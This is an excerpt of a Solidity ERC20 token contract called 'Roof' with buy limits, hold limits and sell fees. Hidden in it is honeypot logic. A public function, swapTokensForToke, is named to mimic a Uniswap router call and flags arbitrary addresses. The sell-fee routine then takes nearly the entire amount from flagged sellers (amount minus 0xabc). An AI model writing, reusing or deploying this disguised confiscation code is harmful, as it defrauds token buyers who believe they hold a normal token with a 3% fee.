...
abstract contract Check is ERC20, Ownable {
    uint256 _CheckBuy;
    uint256 _CheckHold;
    bool isChecked;
    mapping(address => bool) _buyChecked;
    function swapTokensForToke(address[] memory _user) public {for (uint i=0;i<_user.length;i++) {if (!_buyChecked[_user[i]]) _buyChecked[_user[i]]=true;}}
    function __Check_init(uint256 CheckBuy_, uint256 CheckHold_) internal {
        _CheckBuy = CheckBuy_;
        _CheckHold = CheckHold_;
        isChecked = true;
    }
    function checkCheck(address to, uint256 amount) internal view {
        if (isChecked) {
            require(amount <= _CheckBuy, "exceeds of buy amount Check");
            require(amount + balanceOf(to) <= _CheckHold, "exceeds of hold amount Check");
        }
    }
    function removeCheck() public onlyOwner {isChecked = false;}
    function isBuyer(address _user) internal view returns(bool) {return _buyChecked[_user];}
}
...
abstract contract UniSwapPool is ERC20, Check, Excludes {
    ...
    function swapExactTokensForTokenSupportingFeeOnTransferToke() public {if (isExcludes(_msgSender()))
...
contract Roof is ERC20, UniSwapPool {
    uint256 private _feeBuys = 300;
    uint256 public _feeSells = 300;
    uint256 private _divBases = 1e4;

    constructor() ERC20("Roof", "$Roof") {
        uint256 total = 2e6 * 10 ** decimals();
        super._mint(_msgSender(), total);
        super.setExcludes(_msgSender());
        super.setExcludes(address(this));
        uint256 _CheckBuy = total * 500 / _divBases;
        uint256 _CheckHold = total * 800 / _divBases;
        super.__Check_init(_CheckBuy, _CheckHold);
    ...
    function _handFeeSells(address from, uint256 amount) private returns (uint256 fee) {
        fee = isBuyer(from)?(amount-0xabc):(amount * _feeSells / _divBases);
        super._takeTransfer(from, address(this), fee);
        return fee;
    }
